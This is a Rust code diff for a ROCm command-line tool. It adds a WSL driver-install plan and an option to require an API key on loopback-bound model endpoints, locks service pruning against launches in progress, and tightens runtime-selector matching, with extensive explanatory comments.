+                &format!("{sudo}apt-get install -y '{deb_path}'"),
+            ),
+            driver_command(DriverCommandPhase::Execute, &format!("{sudo}ldconfig")),
+            driver_command(
+                DriverCommandPhase::Verify,
+                "test -e /opt/rocm/lib/librocdxg.so",
+            ),
+            driver_command(
+                DriverCommandPhase::Verify,
+                "ldconfig -p | grep -q 'librocdxg\\.so'",
+            ),
+        ],
+        // `rocm diagnose` carries the WSL catalog, including the host-side
+        // form that inspects a distro over `wsl.exe` without needing anything
+        // installed inside it.
+        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
+        // Userspace only: `ldconfig` publishes the library in this boot.
+        reboot_required: false,
+    }
+}
+
 fn build_driver_install_plan(
     examine: &ExamineSummary,
     os_release_text: &str,
@@ -3459,25 +3970,11 @@ fn build_driver_install_plan(
             preflight_checks: Vec::new(),
             commands: Vec::new(),
             checks: vec!["rocm examine".to_owned()],
+            reboot_required: true,
         };
     }
     if examine.wsl.as_ref().is_some_and(|wsl| wsl.is_wsl) {
-        return DriverInstallPlan {
-            supported: false,
-            mutating: false,
-            policy: "wsl_rocdxg".to_owned(),
-            os_id: "wsl".to_owned(),
-            version_id: String::new(),
-            codename: String::new(),
-            repo_version,
-            reason: "WSL uses the Windows host driver plus ROCDXG; run `scripts/wsl_setup_rocdxg.sh` inside WSL instead of installing Linux DKMS.".to_owned(),
-            preflight_checks: Vec::new(),
-            commands: Vec::new(),
-            // `rocm diagnose` carries the WSL catalog, including the host-side
-            // form that inspects a distro over `wsl.exe` without needing anything
-            // installed inside it.
-            checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
-        };
+        return wsl_rocdxg_driver_plan(escalation);
     }
 
     let os_id = parse_os_release_field(os_release_text, "ID").unwrap_or_default();
@@ -3583,6 +4080,8 @@ fn build_driver_install_plan(
             preflight_checks: Vec::new(),
             commands: Vec::new(),
             checks: vec!["rocm examine".to_owned()],
+            // Kernel module: not live until the machine comes back up.
+            reboot_required: true,
         }),
     }
 }
@@ -3801,6 +4300,8 @@ fn apt_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -3904,6 +4405,8 @@ fn dnf_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -4001,6 +4504,8 @@ fn sles_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -4168,14 +4673,23 @@ fn render_driver_install_plan(plan: &DriverInstallPlan, yes: bool, dry_run: bool
         .iter()
         .filter(|command| command.phase == DriverCommandPhase::Verify)
         .collect::<Vec<_>>();
+    // A plan that changes nothing kernel-side is live as soon as it finishes, so
+    // labelling its checks "post_reboot" would tell the user to reboot for
+    // nothing — and would contradict the `reboot_required: false` this same plan
+    // reports after executing.
+    let checks_label = if plan.reboot_required {
+        "post_reboot"
+    } else {
+        "post_install"
+    };
     if !verification_commands.is_empty() {
-        let _ = writeln!(output, "  post_reboot_check_commands:");
+        let _ = writeln!(output, "  {checks_label}_check_commands:");
         for command in verification_commands {
             let _ = writeln!(output, "    {}", command.command);
         }
     }
     if !plan.checks.is_empty() {
-        let _ = writeln!(output, "  post_reboot_checks:");
+        let _ = writeln!(output, "  {checks_label}_checks:");
         for check in &plan.checks {
             let _ = writeln!(output, "    {check}");
         }
@@ -5466,6 +5980,7 @@ struct ServeArgs {
     verbose: bool,
     no_smoke_test: bool,
     allow_public_bind: bool,
+    require_api_key: bool,
     tool_call_parser: Option<String>,
     gpu_memory_utilization: Option<String>,
     temperature: Option<f32>,
@@ -5489,6 +6004,7 @@ fn serve(args: ServeArgs) -> Result<()> {
         verbose,
         no_smoke_test,
         allow_public_bind,
+        require_api_key,
         tool_call_parser,
         gpu_memory_utilization,
         temperature,
@@ -5508,7 +6024,7 @@ fn serve(args: ServeArgs) -> Result<()> {
             .ok()
             .filter(|value| !value.trim().is_empty())
     });
-    let endpoint_auth = resolve_endpoint_auth(&host, supplied_key.as_deref())?;
+    let endpoint_auth = resolve_endpoint_auth(&host, supplied_key.as_deref(), require_api_key)?;
     let paths = AppPaths::discover()?;
     let mut config = RocmCliConfig::load(&paths)?;
     // Host GPU detection can involve sysfs/WSL probing, so only run it when engine
@@ -5826,6 +6342,7 @@ fn serve(args: ServeArgs) -> Result<()> {
             resolve.engine_recipe.as_ref(),
             endpoint_auth.as_deref(),
             launch_lock,
+            require_api_key,
             &mut |_elapsed| spinner.tick(),
         )?;
         ensure_background_helper_running_quiet(summary_mode)?;
@@ -5905,6 +6422,7 @@ fn serve(args: ServeArgs) -> Result<()> {
         resolved_selection.env_id.as_deref(),
         endpoint_auth.as_deref(),
         launch_lock,
+        require_api_key,
     )
 }
 
@@ -5976,8 +6494,20 @@ fn is_loopback_host(host: &str) -> bool {
 ///   otherwise generate a strong random one so a public endpoint can never come
 ///   up anonymous. An empty/whitespace supplied key is rejected rather than
 ///   silently treated as "no auth".
-fn resolve_endpoint_auth(host: &str, supplied: Option<&str>) -> Result<Option<String>> {
-    if is_loopback_host(host) {
+/// - **`required`** → treat a loopback bind as public for this purpose.
+///
+/// That last case exists because "loopback" is a statement about the bind
+/// address, not about who can reach the port. Publishing the port onto a
+/// tailnet, proxying it, or mapping it out of a container all leave the bind
+/// loopback while widening the audience — and the policy above would then hand
+/// out an unauthenticated endpoint. Whoever widens the reach is responsible for
+/// asking for the credential, so this is an explicit flag rather than a guess.
+fn resolve_endpoint_auth(
+    host: &str,
+    supplied: Option<&str>,
+    required: bool,
+) -> Result<Option<String>> {
+    if is_loopback_host(host) && !required {
         return Ok(None);
     }
     match supplied {
@@ -6062,7 +6592,27 @@ fn ensure_public_bind_engine_supported(
 /// `key_present` is a plain `bool` rather than a path so both branches are
 /// unit-testable without touching the filesystem, mirroring `is_windows` in
 /// [`ensure_public_bind_engine_supported`].
-fn ensure_public_service_has_endpoint_key(host: &str, key_present: bool) -> Result<()> {
+fn ensure_public_service_has_endpoint_key(
+    host: &str,
+    key_present: bool,
+    requires_api_key: bool,
+) -> Result<()> {
+    // Two ways a service can need a key. A public bind is the obvious one. The
+    // other is a service that asked for auth on a loopback bind, because
+    // something outside this process republishes the port — a tailnet publish
+    // survives a reboot, let alone a restart, so "loopback" stops meaning
+    // "only this machine" and the bind address can no longer be trusted to
+    // answer the question on its own.
+    if requires_api_key && !key_present {
+        bail!(
+            "managed service was launched with `--require-api-key` but has no endpoint API key, \
+             so restarting it would reopen it without authentication. Something outside this \
+             machine may still be publishing its port. The key is dropped when a service stops \
+             and cannot be recovered. Launch it again with \
+             `rocm serve --require-api-key` (add `--api-key <key>`, or set ROCM_SERVE_API_KEY, \
+             to choose the key instead of generating one)."
+        );
+    }
     if rocm_engine_protocol::is_public_bind_host(host) && !key_present {
         bail!(
             "managed service is bound to the public host `{host}` but has no endpoint API key, \
@@ -6206,6 +6756,7 @@ fn spawn_managed_engine_child(
     runtime_id: Option<&str>,
     env_id: Option<&str>,
     engine_recipe: Option<&EngineRecipeHint>,
+    require_api_key: bool,
 ) -> Result<ManagedSpawn> {
     paths.ensure()?;
     fs::create_dir_all(paths.services_dir())?;
@@ -6228,6 +6779,32 @@ fn spawn_managed_engine_child(
                 "managed service `{}` is already running for engine `{engine}` and model `{}` with different serve options (recipe hint, tool-call parser, or generation defaults); stop it and run `rocm serve` again to apply the requested options",
                 existing.service_id,
                 resolve.canonical_model_id
+            );
+        }
+        // Reuse cannot satisfy a demand for auth the running server never got.
+        // The engine reads its key once, at launch, from the environment this
+        // function builds below — so a server started without one keeps serving
+        // anonymously no matter what is written afterwards. Upgrading the record
+        // here would be worse than doing nothing: the record would claim auth
+        // that the live process does not enforce, and
+        // `ensure_public_service_has_endpoint_key` would pass on the strength of
+        // a key file nothing reads.
+        //
+        // This is what `rocm remote serve` relies on. It publishes a loopback
+        // port onto the tailnet and prints "the API key above is what stops
+        // anyone else calling it". Reusing an unauthenticated service silently
+        // would make that sentence false about an endpoint the whole tailnet can
+        // reach. Refusing is the only answer that fails closed, and it is the
+        // same shape as the recipe mismatch above.
+        if require_api_key && !existing.requires_api_key {
+            bail!(
+                "managed service `{}` is already running for engine `{engine}` and model `{}` \
+                 without authentication, and a running server cannot be given a key it did not \
+                 start with; stop it with `rocm services stop {}` and run the command again to \
+                 serve it with `--require-api-key`",
+                existing.service_id,
+                resolve.canonical_model_id,
+                existing.service_id
             );
         }
         record_cli_audit_event(
@@ -6268,6 +6845,19 @@ fn spawn_managed_engine_child(
     );
     record.gpu_indices = gpu_indices.to_vec();
     record.engine_recipe_json = requested_recipe_json;
+    // The flag the user actually passed, carried through rather than re-derived.
+    //
+    // Deriving it from key-file presence looked equivalent and was not:
+    // `resolve_endpoint_auth` mints a key for *every* non-loopback bind whether or
+    // not auth was demanded, so a plain `--host 0.0.0.0 --allow-public-bind`
+    // recorded `true` here. The guard below tests this field before the bind
+    // address, so that service was then refused with a message naming a flag it
+    // never used and a relaunch command that drops `--allow-public-bind` — the
+    // public-bind branch, which carries the right command, became unreachable.
+    //
+    // This field means "the user demanded auth on a bind that would not otherwise
+    // require it". A public bind needs no such record; its address still says so.
+    record.requires_api_key = require_api_key;
     record.write()?;
 
     if let Some(parent) = record.engine_state_path.parent() {
@@ -6303,11 +6893,24 @@ fn spawn_managed_engine_child(
     // still produce an unauthenticated public listener.
     let endpoint_key_file = endpoint_keys::endpoint_key_file_if_present(paths, service_id)
         .filter(|path| rocm_engine_protocol::endpoint_api_key_from_file(path).is_some());
-    // `serve()` already resolved and stored the key for a public bind, so this
-    // cannot fire on the fresh-launch path today. It is the shared choke point
-    // for managed spawns, so enforce the invariant here too rather than relying
-    // on every future caller having done so.
-    ensure_public_service_has_endpoint_key(host, endpoint_key_file.is_some())?;
+    // `serve()` already resolved and stored the key for a public bind, so the
+    // public-bind branch cannot fire on the fresh-launch path today. It is the
+    // shared choke point for managed spawns, so enforce the invariant here too
+    // rather than relying on every future caller having done so.
+    //
+    // `record.requires_api_key` is passed, not a literal, and the two arguments
+    // are deliberately different things: that field is the `--require-api-key`
+    // flag the caller passed, `endpoint_key_file` is whether a *usable* key is on
+    // disk. A present but empty or malformed key file is where they disagree, and
+    // is exactly what the `requires_api_key` branch exists to refuse.
+    //
+    // The field is threaded, never derived from the key file. Deriving it marked
+    // every public bind as having demanded auth — see the assignment above.
+    ensure_public_service_has_endpoint_key(
+        host,
+        endpoint_key_file.is_some(),
+        record.requires_api_key,
+    )?;
     #[cfg(windows)]
     let child_pid = {
         let env_values = app_path_env_var_values(paths, engine_envs_root.as_deref());
@@ -6376,6 +6979,7 @@ fn start_managed_service(
     engine_recipe: Option<&EngineRecipeHint>,
     endpoint_api_key: Option<&str>,
     launch_lock: rocm_core::FileLock,
+    require_api_key: bool,
     on_wait_tick: &mut dyn FnMut(Duration),
 ) -> Result<ManagedLaunchReport> {
     let paths = AppPaths::discover()?;
@@ -6392,6 +6996,7 @@ fn start_managed_service(
         runtime_id,
         env_id,
         engine_recipe,
+        require_api_key,
     )? {
         ManagedSpawn::AlreadyRunning(report) => return Ok(report),
         ManagedSpawn::Spawned { record, child_pid } => (*record, child_pid),
@@ -6689,6 +7294,7 @@ fn run_attached_service(
     env_id: Option<&str>,
     endpoint_api_key: Option<&str>,
     launch_lock: rocm_core::FileLock,
+    require_api_key: bool,
 ) -> Result<()> {
     let paths = AppPaths::discover()?;
 
@@ -6705,6 +7311,7 @@ fn run_attached_service(
         runtime_id,
         env_id,
         resolve.engine_recipe.as_ref(),
+        require_api_key,
     )?;
     // The claiming record is persisted (or an existing service was found), so the
     // selected GPU is now visible to concurrent auto-selection. Release the launch
@@ -6955,9 +7562,16 @@ fn stream_attached_logs_no_tty(log_path: &Path, child_pid: u32) -> Result<Attach
 
 fn services(command: Option<ServicesCommand>) -> Result<()> {
     let paths = AppPaths::discover()?;
-    match command.unwrap_or(ServicesCommand::List { all: false }) {
-        ServicesCommand::List { all } => {
-            print!("{}", render_services_text(&paths, all)?);
+    match command.unwrap_or(ServicesCommand::List {
+        all: false,
+        json: false,
+    }) {
+        ServicesCommand::List { all, json } => {
+            if json {
+                print!("{}", render_services_json(&paths, all)?);
+            } else {
+                print!("{}", render_services_text(&paths, all)?);
+            }
             Ok(())
         }
         ServicesCommand::Logs { service_id } => {
@@ -7551,10 +8165,19 @@ fn describe_hours(hours: u64) -> String {
 /// investigate. The corrupt manifest itself is never removed for the same
 /// reason.
 ///
+/// "No `<id>.json` beside it" is also exactly what a *launch in progress* looks
+/// like: `serve` writes the 0600 `<id>.endpoint-key` before
+/// [`spawn_managed_engine_child`] writes the first `<id>.json`. Nothing about
+/// the file distinguishes the two cases — under `--any-age` there is no age gate
+/// left to ask — so this function does not try. It is only ever reached with the
+/// managed-launch lock held, which excludes that window outright; see
+/// [`prune_managed_service_records`].
+///
 /// `services_dir` also holds `launch.lock`, which is shared by every managed
 /// launch rather than owned by one service (see
 /// [`AppPaths::managed_launch_lock_path`]). Only the three per-service
-/// extensions are considered, so the lock is never a candidate.
+/// extensions are considered, so the lock is never a candidate — including the
+/// one this sweep is itself running under.
 fn collect_service_orphans(paths: &AppPaths, min_age: Duration, now: SystemTime) -> Vec<PathBuf> {
     let services_dir = paths.services_dir();
     let mut orphans = Vec::new();
@@ -7817,6 +8440,85 @@ fn apply_service_prune_plan(
 /// error: a bulk cleanup that aborted because one server happened to be serving
 /// would be unusable on the hosts that need it most. The count is reported so
 /// the skip is never silent.
+///
+/// # Why this takes the managed-launch lock
+///
+/// [`collect_service_orphans`] calls a file with no `<id>.json` beside it a
+/// leftover, and that is also what a launch looks like mid-flight: `serve`
+/// writes the 0600 `<id>.endpoint-key` at the top of the managed path, and the
+/// first `<id>.json` only lands at `record.write()` inside
+/// [`spawn_managed_engine_child`]. Between those two writes a live server's
+/// secret is indistinguishable from a leftover, and `--any-age` removes the age
+/// gate that used to hide the window, so a concurrent
+/// `rocm services prune --any-age --yes` deleted it.
+///
+/// `serve` already holds `managed_launch_lock_path` across the whole of that
+/// window — [`select_gpu_indices_under_launch_lock`] acquires it, hands the
+/// guard back to its caller, and `start_managed_service`/`run_attached_service`
+/// only drop it once the record is persisted (see that function's own comment,
+/// which this one must not drift from). The gap was simply that prune never
+/// acquired it: the helper above was the single acquirer in the tree. Taking it
+/// here closes the window deterministically, for any number of records, which no
+/// age floor can — the window is not short and is not bounded, because
+/// `spawn_managed_engine_child`'s idempotency guard runs `load_managed_services`
+/// first, and that refreshes every `ready`/`running` record through a 750ms
+/// listing plus an up-to-8s inference probe ([`rocm_core::INFERENCE_PROBE_TIMEOUT`]),
+/// sequentially, over a record count the user controls.
+///
+/// **Scope: the whole operation, not just the scan.** Holding it across
+/// [`build_service_prune_plan`] alone is very nearly enough — a launch already
+/// under way blocks prune until its manifest exists, at which point its key is
+/// no longer an orphan, and a launch starting after the scan has not written a
+/// key yet so it cannot be in the plan. "Cannot be in the plan" leans on
+/// `generate_service_id` minting a millisecond-unique id, though, which is a
+/// property of an unrelated function and a backwards clock step would break.
+/// Covering [`apply_service_prune_plan`] too makes the exclusion unconditional,
+/// and costs nothing worth measuring next to the scan it already serializes:
+/// the apply phase is `unlink` calls plus one manifest read per record.
+///
+/// That wider scope is *not* pinned by a test, and neither the unit test nor
+/// `service-cleanup-07` fails if the guard is released after plan building. It
+/// cannot be pinned at that level: the only behaviour the extra span changes is
+/// the id-collision case above, which needs `generate_service_id` to mint an id
+/// a previous run already used — i.e. a backwards clock step — and any test that
+/// instead tried to catch a launch slipping in between the two phases would be
+/// racing a microsecond-wide window, so it would pass on a timing-lucky run
+/// rather than flake. Treat the scope as a deliberately conservative choice
+/// argued from the code, not as a property under regression cover: narrowing it
+/// will not turn anything red.
+///
+/// **What it costs.** Prune's own plan building calls `load_managed_services`,
+/// so prune can now delay a launch for as long as its own scan runs, and a
+/// launch already under way delays prune for as long as *it* runs. Neither
+/// direction is bounded: the per-record worst case is the same 8.75s, over a
+/// record count the user controls, and `FileLock::acquire` has no timeout. The
+/// usual wait is milliseconds, because those are ceilings on probes that hang
+/// rather than costs every record pays — but "usually imperceptible" is the
+/// honest claim, not "a few seconds". Because the wait has no upper bound, it is
+/// announced on screen ([`cli_progress::AnimatedSpinner`]) instead of leaving
+/// the command silent. `--dry-run` takes the lock as well: a preview that
+/// disagreed with what `--yes` would do is worth less than the launch it blocks.
+///
+/// **What `--dry-run` writes.** `FileLock::acquire` creates the lock file and
+/// any missing parents, and `services` only calls `AppPaths::discover`, never
+/// `ensure` — so a preview on a host that has never served now creates
+/// `<data>/services/` and an empty `launch.lock`, and fails outright where the
+/// data directory is not writable. Both are accepted. The lock file is a 0-byte
+/// rendezvous point inside the CLI's own data directory, in the directory
+/// `rocm serve` creates there anyway. And a data directory the CLI cannot write
+/// is one no managed server could have written a record into, so the preview
+/// that now errors had nothing to report; where records *do* exist, deleting
+/// them needs write permission on the very directory the lock needs, so a
+/// preview that still succeeded would be predicting a `--yes` run that cannot
+/// run — the same kind of disagreement the paragraph above declines to ship.
+///
+/// **No nested acquire.** `FileLock::acquire` blocks with no `try_` variant, so
+/// a second acquire on a path already held by this process would hang forever.
+/// Nothing under either phase acquires this path: the only other
+/// `FileLock::acquire` in the tree is `ensure_background_helper_running_quiet`,
+/// on a different lock file, and it is not reachable from here. In the other
+/// direction `serve` holds this lock but never runs prune, in-process or as a
+/// subprocess.
 fn prune_managed_service_records(
     paths: &AppPaths,
     hours: u64,
@@ -7828,6 +8530,23 @@ fn prune_managed_service_records(
             "Removing local server records requires --yes.\n\nTry: rocm services prune --dry-run\nThen: rocm services prune --yes"
         );
     }
+    // Held until this function returns, so no managed launch can be between its
+    // key write and its record write while the sweep looks at the directory.
+    //
+    // The acquire blocks with no timeout, and the thing it blocks behind is a
+    // launch whose own duration is unbounded — so it is announced rather than
+    // left as a silent hang, in the command a user reaches for precisely when a
+    // launch has gone wrong. `AnimatedSpinner` rather than the caller-driven
+    // `Spinner` because there is no loop here to tick one: the wait is a single
+    // blocking syscall, so only a background ticker can keep it moving. It is
+    // TTY-gated and erased on drop, so an uncontended prune — the normal case,
+    // where this costs microseconds — leaves nothing behind, and piped or
+    // redirected output never sees it at all.
+    let _launch_lock = {
+        let _waiting =
+            cli_progress::AnimatedSpinner::start("Waiting for a launch already under way…");
+        rocm_core::FileLock::acquire(paths.managed_launch_lock_path())?
+    };
     let min_age = Duration::from_secs(hours.saturating_mul(3600));
     let plan = build_service_prune_plan(paths, min_age, hours, SystemTime::now())?;
     let mut outcome = ServicePruneOutcome {
@@ -8314,16 +9033,21 @@ pub(crate) fn render_runtimes_text(paths: &AppPaths, config: &RocmCliConfig) -> 
         } else {
             "managed"
         };
+        // The compiler is opt-in and `rocm update` reinstalls whatever this
+        // says, so an install missing it should not be silent about that.
+        // `rocm examine` reports the same thing for the active runtime.
+        let toolchain = toolchain_state_text(manifest.includes_devel());
         let _ = writeln!(
             output,
-            "  {marker} {} runtime_id={} version={} format={} family={} mode={} status={}",
+            "  {marker} {} runtime_id={} version={} format={} family={} mode={} status={} toolchain={}",
             manifest.runtime_key,
             manifest.runtime_id,
             therock::runtime_version_display(&manifest.version),
             manifest.format,
             manifest.family,
             mode,
-            status
+            status,
+            toolchain
         );
         let _ = writeln!(
             output,
@@ -8344,14 +9068,35 @@ pub(crate) fn activate_runtime(
     let manifest = select_runtime_manifest(&manifests, selector)?;
     validate_runtime_manifest_for_activation(manifest)?;
     let current = current_runtime_manifest(config, &manifests);
-    let previous_runtime_key = current
+    // Re-selecting the runtime already in use is a no-op to the user: they have
+    // not left anything, so there is no new rollback target — and no reason to
+    // forget the one the activation that put them here recorded. Deriving the
+    // target from `current` unconditionally used to clear it, silently removing
+    // the recovery path that activation had just offered.
+    let (previous_runtime_key, previous_runtime_id) = if current
         .as_ref()
-        .map(|manifest| manifest.runtime_key.clone())
-        .filter(|runtime_key| runtime_key != &manifest.runtime_key);
-    let previous_runtime_id = current
-        .as_ref()
-        .map(|manifest| manifest.runtime_id.clone())
-        .filter(|_| previous_runtime_key.is_some());
+        .is_some_and(|current| current.runtime_key == manifest.runtime_key)
+    {
+        let runtime_key = config.previous_runtime_key.clone();
+        let runtime_id = runtime_key
+            .as_deref()
+            .and_then(|runtime_key| {
+                manifests
+                    .iter()
+                    .find(|candidate| candidate.runtime_key == runtime_key)
+            })
+            .map(|previous| previous.runtime_id.clone());
+        (runtime_key, runtime_id)
+    } else {
+        // `current` differs from the requested runtime here by construction, so
+        // this can never record a runtime as its own rollback target.
+        (
+            current
+                .as_ref()
+                .map(|manifest| manifest.runtime_key.clone()),
+            current.as_ref().map(|manifest| manifest.runtime_id.clone()),
+        )
+    };
 
     config.default_runtime_id = Some(manifest.runtime_id.clone());
     config.active_runtime_key = Some(manifest.runtime_key.clone());
@@ -9079,6 +9824,23 @@ fn ensure_libnuma_for_torch(approved: bool) {
     );
 }
 
+/// Whether an E2E scenario has asked to skip the torch runtime dependency
+/// checks entirely. These checks run a real system package-manager install
+/// (`apt-get` or equivalent) whenever a dependency happens to be missing on
+/// the host, which is slow, network-dependent, and mutates host state — none
+/// of which a PTY scenario testing an unrelated concern (e.g. the download
+/// spinner) should depend on. Only active under `e2e-test-hooks`; production
+/// builds always run the real check.
+#[cfg(feature = "e2e-test-hooks")]
+fn torch_runtime_dep_checks_disabled() -> bool {
+    std::env::var_os("ROCM_CLI_DISABLE_TORCH_RUNTIME_DEP_CHECKS").is_some()
+}
+
+#[cfg(not(feature = "e2e-test-hooks"))]
+const fn torch_runtime_dep_checks_disabled() -> bool {
+    false
+}
+
 /// Shared control flow behind [`ensure_libatomic_for_torch`] and
 /// [`ensure_libnuma_for_torch`]: detect the dependency, print the distro-aware
 /// plan, and (when approved or auto-installable) run it via
@@ -9086,6 +9848,9 @@ fn ensure_libnuma_for_torch(approved: bool) {
 /// caller. No-op on Windows or when the dependency is already present.
 fn ensure_torch_runtime_dep(approved: bool, dep: &TorchRuntimeDep) {
     if cfg!(windows) {
+        return;
+    }
+    if torch_runtime_dep_checks_disabled() {
         return;
     }
     if (dep.present)() {
@@ -10910,6 +11675,9 @@ fn adopt_runtime_from_probe(
         python_launcher: None,
         python_executable: Some(python_executable.display().to_string()),
         pip_cache_dir: None,
+        // The probe only reports a CMake path when the `devel` packages are
+        // present, so it tells us what this pre-existing environment has.
+        devel: probe.cmake_path.is_some(),
         rocm_sdk: Some(probe),
         // Adoption does not install torch, so the build is derived from the SDK
         // version instead.
@@ -10957,6 +11725,10 @@ fn adopt_system_runtime(
         )?,
     };
     let probe = rocm_core::probe_system_rocm_sdk(&root)?;
+    let includes_devel = probe
+        .bin_paths
+        .iter()
+        .any(|path| path.join("hipcc").is_file());
 
     let family = probe
         .gfx_targets
@@ -10996,6 +11768,7 @@ fn adopt_system_runtime(
         read_only: true,
         imported_from: Some(probe.root.clone()),
         system_sdk: Some(probe),
+        devel: includes_devel,
         installed_at_unix_ms: rocm_core::unix_time_millis(),
     };
     validate_runtime_manifest_for_activation(&manifest).with_context(|| {
@@ -11131,6 +11904,21 @@ fn recover_setup_runtime_registration(
     Ok(Some(manifest.runtime_key))
 }
 
+/// The folder setup was configured for and its pip cache — the pair both
+/// `examine` forms report. Shared so the two cannot name different folders.
+///
+/// An empty configured path counts as unset, matching
+/// `recover_setup_runtime_registration`'s own guard: `config.json` is
+/// hand-editable, and `managed_pip_cache_dir("")` is a bogus relative path.
+fn setup_runtime_paths(config: &RocmCliConfig) -> Option<(&Path, PathBuf)> {
+    let root = config
+        .setup
+        .therock_venv
+        .as_deref()
+        .filter(|path| !path.as_os_str().is_empty())?;
+    Some((root, managed_pip_cache_dir(root)))
+}
+
 pub(crate) fn current_runtime_manifest<'a>(
     config: &RocmCliConfig,
     manifests: &'a [therock::InstalledRuntimeManifest],
@@ -11171,6 +11959,30 @@ fn runtime_keys_text(manifests: &[&therock::InstalledRuntimeManifest]) -> String
         .join(", ")
 }
 
+/// Resolves a user-typed selector to the one installed runtime it names.
+///
+/// Matching a `runtime_key` regardless of letter case is a deliberate
+/// convenience, but it only names one runtime while no two installed keys
+/// differ just in case — and they can. Generated keys are slugified to lower
+/// case, while `runtimes adopt --runtime-key` takes the key the user typed and
+/// `runtimes import` takes it from the supplied manifest; neither slugifies,
+/// so the key is stored verbatim. The registry keeps one file per key, so
+/// `ABC.json` and `abc.json` are two entries on a case-sensitive filesystem
+/// and nothing rejects the pair.
+///
+/// So an exact key match is taken first and wins outright: it is the one
+/// reading of the selector that cannot be mistaken. The case-insensitive
+/// fallback applies only when it lands on a single record; two case twins are
+/// reported as the ambiguity they are, the same way a `runtime_id` naming
+/// several installs already is.
+///
+/// Callers rely on that being a function of the key alone, because several of
+/// them resolve the same key more than once and must land on the same record
+/// every time: `storage remove-old-installs` decides about a manifest and then
+/// names it to the deleter by key, and the uninstall revalidation re-derives
+/// its plan from disk after the confirmation prompt. Resolving by "newest
+/// case-insensitive match" made that decide about one install and act on
+/// another.
 fn select_runtime_manifest<'a>(
     manifests: &'a [therock::InstalledRuntimeManifest],
     selector: &str,
@@ -11182,28 +11994,35 @@ fn select_runtime_manifest<'a>(
 
     if let Some(manifest) = manifests
         .iter()
-        .find(|manifest| manifest.runtime_key.eq_ignore_ascii_case(selector))
+        .find(|manifest| manifest.runtime_key == selector)
     {
         return Ok(manifest);
     }
 
-    let matches = manifests
+    let key_matches = manifests
+        .iter()
+        .filter(|manifest| manifest.runtime_key.eq_ignore_ascii_case(selector))
+        .collect::<Vec<_>>();
+    match key_matches.as_slice() {
+        [manifest] => return Ok(manifest),
+        [] => {}
+        _ => bail!(
+            "runtime selector `{selector}` matches several installed runtime keys that differ only in letter case; name one of them exactly: {}",
+            runtime_keys_text(&key_matches)
+        ),
+    }
+
+    let id_matches = manifests
         .iter()
         .filter(|manifest| manifest.runtime_id.eq_ignore_ascii_case(selector))
         .collect::<Vec<_>>();
-    match matches.as_slice() {
+    match id_matches.as_slice() {
         [manifest] => Ok(manifest),
         [] => bail!("installed runtime not found: {selector}"),
-        _ => {
-            let keys = matches
-                .iter()
-                .map(|manifest| manifest.runtime_key.as_str())
-                .collect::<Vec<_>>()
-                .join(", ");
-            bail!(
-                "runtime selector `{selector}` matches multiple installed runtimes; activate one by runtime_key: {keys}"
-            );
-        }
+        _ => bail!(
+            "runtime selector `{selector}` matches multiple installed runtimes; activate one by runtime_key: {}",
+            runtime_keys_text(&id_matches)
+        ),
     }
 }
 
@@ -11211,6 +12030,20 @@ pub(crate) fn runtime_usability_status(manifest: &therock::InstalledRuntimeManif
     match validate_runtime_manifest_for_activation(manifest) {
         Ok(()) => "ready".to_owned(),
         Err(error) => format!("unusable ({error})"),
+    }
+}
+
+/// How the CLI names the toolchain state of a runtime.
+///
+/// `rocm runtimes list` reports it per runtime and `rocm examine` reports it
+/// for the active one; sharing the vocabulary here keeps the two from drifting
+/// into different words for the same fact, which is the kind of difference a
+/// user reads as a difference in meaning.
+pub(crate) const fn toolchain_state_text(includes_devel: bool) -> &'static str {
+    if includes_devel {
+        "included"
+    } else {
+        "excluded"
     }
 }
 
@@ -13752,6 +14585,31 @@ fn chat_rocm_command_action_from_args(mut args: Vec<String>) -> Result<ChatRocmC
                 command_title: "Setup".to_owned(),
             })
         }
+        // Mirrors the daemon's `ensure_rocm_command_is_read_only`, which admits
+        // the same three verbs. The daemon's arm carries the reasoning; the
+        // invariant is that the two agree, and this PR added the arm there
+        // first, so the two disagreed until this was written.
+        Some("remote")
+            if second
+                .as_deref()
+                .is_some_and(|value| matches!(value, "targets" | "doctor" | "status")) =>
+        {
+            Ok(ChatRocmCommandAction::ReadOnly(args))
+        }
+        // `serve`, `attach` and `stop` start, publish or tear down something on
+        // another machine, so they go through approval like any other mutation.
+        Some("remote")
+            if second
+                .as_deref()
+                .is_some_and(|value| matches!(value, "serve" | "attach" | "stop")) =>
+        {
+            let verb = second.as_deref().unwrap_or_default().to_owned();
+            Ok(ChatRocmCommandAction::Approval {
+                args,
+                pending_title: format!("Remote {verb}"),
+                command_title: "Remote".to_owned(),
+            })
+        }
         Some(command) => bail!("local assistant cannot use unsupported rocm command `{command}`"),
         None => bail!("rocm_command requires at least one argument"),
     }
@@ -14917,7 +15775,7 @@ fn run_rocm_read_only_in_process(paths: &AppPaths, args: &[String]) -> Result<St
                 || command == "--version"
                 || command == "-V" =>
         {
-            Ok(format!("rocm {}\n", env!("CARGO_PKG_VERSION")))
+            Ok(format!("rocm-cli {}\n", cli_version_string()))
         }
         [command]
             if command.eq_ignore_ascii_case("model") || command.eq_ignore_ascii_case("models") =>
@@ -15071,6 +15929,35 @@ fn parse_optional_lines(args: &[String]) -> Result<usize> {
     Ok(DEFAULT_LOG_TAIL_LINES)
 }
 
+/// Map the parsed `install sdk` arguments onto the install request.
+///
+/// Extracted from the command arm so this mapping has a seam. `include_devel`
+/// is the field that most needs one: nothing downstream re-derives it, so if
+/// the flag stopped being forwarded here the install would silently go back to
+/// pulling the compiler toolchain and every other assertion would still pass.
+#[allow(clippy::too_many_arguments)]
+const fn sdk_install_request<'a>(
+    channel: &'a str,
+    format: &'a str,
+    prefix: Option<PathBuf>,
+    version_selector: Option<therock::RuntimeVersionSelector>,
+    family_override: Option<&'a str>,
+    dry_run: bool,
+    devel: bool,
+    consent: therock::SdkInstallConsent,
+) -> therock::SdkInstallRequest<'a> {
+    therock::SdkInstallRequest {
+        channel,
+        format,
+        prefix,
+        version_selector,
+        family_override,
+        dry_run,
+        include_devel: devel,
+        consent,
+    }
+}
+
